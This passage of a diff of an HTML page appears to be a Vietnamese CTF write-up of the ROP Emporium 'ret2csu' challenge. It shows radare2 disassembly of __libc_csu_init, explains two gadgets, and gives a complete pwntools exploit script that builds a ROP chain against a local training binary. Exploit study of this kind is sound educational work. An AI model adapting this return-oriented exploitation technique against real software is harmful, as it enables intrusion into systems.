-</span></span><span style=display:flex><span>payload2 += p64(0x4006a3) <span style=font-style:italic># 0x00000000004006a3: pop rdi; ret;</span>
-</span></span><span style=display:flex><span>payload2 += p64(0xdeadbeefdeadbeef) <span style=font-style:italic># -&gt; rdi</span>
-</span></span><span style=display:flex><span>payload2 += p64(ret2win)
-</span></span></code></pre></div><p>Kết hợp 2 payload</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>from pwn import *
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>libc_csu_int = 0x400640 <span style=font-style:italic># 55  0x00000640 0x00400640 GLOBAL FUNC   101      __libc_csu_init</span>
-</span></span><span style=display:flex><span>init = 0x400398 <span style=font-style:italic># 0x400398 point to 0x4004d0 # 8   0x000004d0 0x004004d0 GLOBAL FUNC   0        _init</span>
-</span></span><span style=display:flex><span>ret2win_GOT = 0x601020 <span style=font-style:italic># 0x00400510 ff250a0b2000   jmp qword [reloc.ret2win]   ; [0x601020:8]=0x400516</span>
-</span></span><span style=display:flex><span>ret2win = 0x400510 <span style=font-style:italic>#2   0x00000510 0x00400510 GLOBAL FUNC   16       imp.ret2win</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context.update(arch=<span style=font-style:italic>&#39;amd64&#39;</span>, os=<span style=font-style:italic>&#39;linux&#39;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>p = process(<span style=font-style:italic>&#39;./ret2csu&#39;</span>)
-</span></span><span style=display:flex><span><span style=font-style:italic># gdb.attach(p,&#39;&#39;&#39;</span>
-</span></span><span style=display:flex><span><span style=font-style:italic># break *pwnme</span>
-</span></span><span style=display:flex><span><span style=font-style:italic># &#39;&#39;&#39;)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload1 = <span style=font-style:italic>b</span><span style=font-style:italic>&#39;A&#39;</span>*40
-</span></span><span style=display:flex><span>payload1 += p64(libc_csu_int + 0x5a) <span style=font-style:italic># Gadget 1</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x0) <span style=font-style:italic># rbx</span>
-</span></span><span style=display:flex><span>payload1 += p64(0x1) <span style=font-style:italic># rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp</span>
-</span></span><span style=display:flex><span>payload1 += p64(init) <span style=font-style:italic># r12 -&gt; call qword [r12 + rbx*8]</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xdeadbeefdeadbeef) <span style=font-style:italic># r13 -&gt; edi</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xcafebabecafebabe) <span style=font-style:italic># r14 -&gt; rsi</span>
-</span></span><span style=display:flex><span>payload1 += p64(0xd00df00dd00df00d) <span style=font-style:italic># r15 -&gt; rdx</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>payload2 = p64(libc_csu_int + 0x40) <span style=font-style:italic># Gadget 2</span>
-</span></span><span style=display:flex><span>payload2 += <span style=font-style:italic>b</span><span style=font-style:italic>&#39;B&#39;</span>*8
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># rbx</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># rbp</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r12</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r13</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r14</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x0) <span style=font-style:italic># r15</span>
-</span></span><span style=display:flex><span>payload2 += p64(0x4006a3) <span style=font-style:italic># 0x00000000004006a3: pop rdi; ret;</span>
-</span></span><span style=display:flex><span>payload2 += p64(0xdeadbeefdeadbeef) <span style=font-style:italic># -&gt; rdi</span>
-</span></span><span style=display:flex><span>payload2 += p64(ret2win)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>line1 = p.recvuntil(<span style=font-style:italic>b</span><span style=font-style:italic>&#39;&gt;&#39;</span>)
-</span></span><span style=display:flex><span>print(line1)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>p.sendline(payload1 + payload2)
-</span></span><span style=display:flex><span>line2 = p.recvall()
-</span></span><span style=display:flex><span>print(line2)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=font-style:italic># p.interactive()</span>
-</span></span></code></pre></div></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+<span class=sr-only>Link to heading</span></a></h2><p>Challenge 8 tương tự Challenge 3 callme, tuy nhiên ta sẽ sử dụng phương pháp khác để kiểm soát các giá trị rdi, rsi, rdx (3 thanh ghi chứa tham số arg1, arg2, arg3)</p><p><a href=https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf>https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p><p>Ở đây ta sẽ có 2 Gadget, sử dụng radare2 để disassemble function __libc_csu_init__</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain> radare2 ret2csu 
+[0x00400520]&gt; aaa
+[0x00400520]&gt; afl
+...
+0x00400640    4 101          sym.__libc_csu_init
+...
+[0x00400520]&gt; s sym.__libc_csu_init
+[0x00400640]&gt; pdf
+            ; DATA XREF from entry0 @ 0x400536
+┌ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
+│           ; arg int64_t arg1 @ rdi
+│           ; arg int64_t arg2 @ rsi
+│           ; arg int64_t arg3 @ rdx
+│           0x00400640      4157           push r15
+│           0x00400642      4156           push r14
+│           0x00400644      4989d7         mov r15, rdx                ; arg3
+│           0x00400647      4155           push r13
+│           0x00400649      4154           push r12
+│           0x0040064b      4c8d259e0720.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
+│                                                                      ; 0x600df0
+│           0x00400652      55             push rbp
+│           0x00400653      488d2d9e0720.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
+│                                                                      ; 0x600df8
+│           0x0040065a      53             push rbx
+│           0x0040065b      4189fd         mov r13d, edi               ; arg1
+│           0x0040065e      4989f6         mov r14, rsi                ; arg2
+│           0x00400661      4c29e5         sub rbp, r12
+│           0x00400664      4883ec08       sub rsp, 8
+│           0x00400668      48c1fd03       sar rbp, 3
+│           0x0040066c      e85ffeffff     call sym._init
+│           0x00400671      4885ed         test rbp, rbp
+│       ┌─&lt; 0x00400674      7420           je 0x400696
+│       │   0x00400676      31db           xor ebx, ebx
+│       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
+│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
+│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
+│      ╎│   0x00400683      4c89f6         mov rsi, r14
+│      ╎│   0x00400686      4489ef         mov edi, r13d
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+│      ╎│   0x0040068d      4883c301       add rbx, 1
+│      ╎│   0x00400691      4839dd         cmp rbp, rbx
+│      └──&lt; 0x00400694      75ea           jne 0x400680
+│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
+│       └─&gt; 0x00400696      4883c408       add rsp, 8
+│           0x0040069a      5b             pop rbx
+│           0x0040069b      5d             pop rbp
+│           0x0040069c      415c           pop r12
+│           0x0040069e      415d           pop r13
+│           0x004006a0      415e           pop r14
+│           0x004006a2      415f           pop r15
+└           0x004006a4      c3             ret
+[0x00400640]&gt;
+</code></pre><p>Ta có Gadget 1:</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
+│      ╎│   0x00400683      4c89f6         mov rsi, r14
+│      ╎│   0x00400686      4489ef         mov edi, r13d
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+</code></pre><p>Gadget 2</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>│           0x0040069a      5b             pop rbx
+│           0x0040069b      5d             pop rbp
+│           0x0040069c      415c           pop r12
+│           0x0040069e      415d           pop r13
+│           0x004006a0      415e           pop r14
+│           0x004006a2      415f           pop r15
+└           0x004006a4      c3             ret
+</code></pre><p>Với payload 1 ta sử dụng Gadget 2 để truyền giá trị arg vào r13, r14, r15, Gadget 2 cũng control r12 để kết hợp với Gadget 1 gọi đến hàm chúng ta mong muốn đồng thời control edi, rsi, rdx</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>payload1 = b&#39;A&#39;*40
+payload1 += p64(libc_csu_int + 0x5a) # Gadget 1
+payload1 += p64(0x0) # rbx
+payload1 += p64(0x1) # rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp
+payload1 += p64(init) # r12 -&gt; call qword [r12 + rbx*8]
+payload1 += p64(0xdeadbeefdeadbeef) # r13 -&gt; edi
+payload1 += p64(0xcafebabecafebabe) # r14 -&gt; rsi
+payload1 += p64(0xd00df00dd00df00d) # r15 -&gt; rdx
+</code></pre><p>Tới đây ta có rsi và rdx, riêng rdi ta cần phải thực hiện ở payload2, đó là lí do ta không gọi trực tiếp hàm ret2win với r12</p><p>Với r12 ta sử dụng hàm <code>__init__</code> vì  nó không cần đối số</p><p>Ta thấy sau <code>call qword [r12 + rbx*8]</code> thì rbx sẽ từ 0 thêm 1 và nếu rbp khác rbx  thì sẽ quay lại 0x400680. Đó là lý do ở payload 1 ta sẽ cho rbp bằng 0x1 để thực hiện đoạn tiếp theo và đoạn này chứa Gadget 2</p><pre tabindex=0><code class=language-text-plain data-lang=text-plain>│      ┌──&gt; 0x00400680      4c89fa         mov rdx, r15
+│      ╎│   0x00400683      4c89f6         mov rsi, r14
+│      ╎│   0x00400686      4489ef         mov edi, r13d
+│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
+│      ╎│   0x0040068d      4883c301       add rbx, 1
+│      ╎│   0x00400691      4839dd         cmp rbp, rbx
+│      └──&lt; 0x00400694      75ea           jne 0x400680
+</code></pre><p>Ở payload 2 ta sẽ thêm vào rsp một đoạn padding bất kỳ do kế tiếp payload 1 sẽ là <code>add rsp, 8</code>, tại payload 2 ta gọi hàm trong r12 ở đây là <code>__init__</code> (chỉ để giữ nguyên rsi, rdi, rdx). Kế tiếp ta truyền giá trị cho rdi do Gadget 2 trước đó chỉ control được edi. </p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>payload2 = p64(libc_csu_int + 0x40) # Gadget 2
+payload2 += b&#39;B&#39;*8
+payload2 += p64(0x0) # rbx
+payload2 += p64(0x0) # rbp
+payload2 += p64(0x0) # r12
+payload2 += p64(0x0) # r13
+payload2 += p64(0x0) # r14
+payload2 += p64(0x0) # r15
+payload2 += p64(0x4006a3) # 0x00000000004006a3: pop rdi; ret;
+payload2 += p64(0xdeadbeefdeadbeef) # -&gt; rdi
+payload2 += p64(ret2win)
+</code></pre><p>Kết hợp 2 payload</p><pre tabindex=0><code class=language-text-x-python data-lang=text-x-python>from pwn import *
+
+libc_csu_int = 0x400640 # 55  0x00000640 0x00400640 GLOBAL FUNC   101      __libc_csu_init
+init = 0x400398 # 0x400398 point to 0x4004d0 # 8   0x000004d0 0x004004d0 GLOBAL FUNC   0        _init
+ret2win_GOT = 0x601020 # 0x00400510 ff250a0b2000   jmp qword [reloc.ret2win]   ; [0x601020:8]=0x400516
+ret2win = 0x400510 #2   0x00000510 0x00400510 GLOBAL FUNC   16       imp.ret2win
+
+
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+
+p = process(&#39;./ret2csu&#39;)
+# gdb.attach(p,&#39;&#39;&#39;
+# break *pwnme
+# &#39;&#39;&#39;)
+
+payload1 = b&#39;A&#39;*40
+payload1 += p64(libc_csu_int + 0x5a) # Gadget 1
+payload1 += p64(0x0) # rbx
+payload1 += p64(0x1) # rbp -&gt; add rbx, 0x1;cmp rbp, rbx; jne __libc_csu_init -&gt; rbx==rbp
+payload1 += p64(init) # r12 -&gt; call qword [r12 + rbx*8]
+payload1 += p64(0xdeadbeefdeadbeef) # r13 -&gt; edi
+payload1 += p64(0xcafebabecafebabe) # r14 -&gt; rsi
+payload1 += p64(0xd00df00dd00df00d) # r15 -&gt; rdx
+
+payload2 = p64(libc_csu_int + 0x40) # Gadget 2
+payload2 += b&#39;B&#39;*8
+payload2 += p64(0x0) # rbx
+payload2 += p64(0x0) # rbp
+payload2 += p64(0x0) # r12
+payload2 += p64(0x0) # r13
+payload2 += p64(0x0) # r14
+payload2 += p64(0x0) # r15
+payload2 += p64(0x4006a3) # 0x00000000004006a3: pop rdi; ret;
+payload2 += p64(0xdeadbeefdeadbeef) # -&gt; rdi
+payload2 += p64(ret2win)
+
+line1 = p.recvuntil(b&#39;&gt;&#39;)
+print(line1)
+
+p.sendline(payload1 + payload2)
+line2 = p.recvall()
+print(line2)
+
+# p.interactive()
+</code></pre></div><footer></footer></article></section></div><footer class=footer><section class=container>©
 2022 -
 2026
 Minix
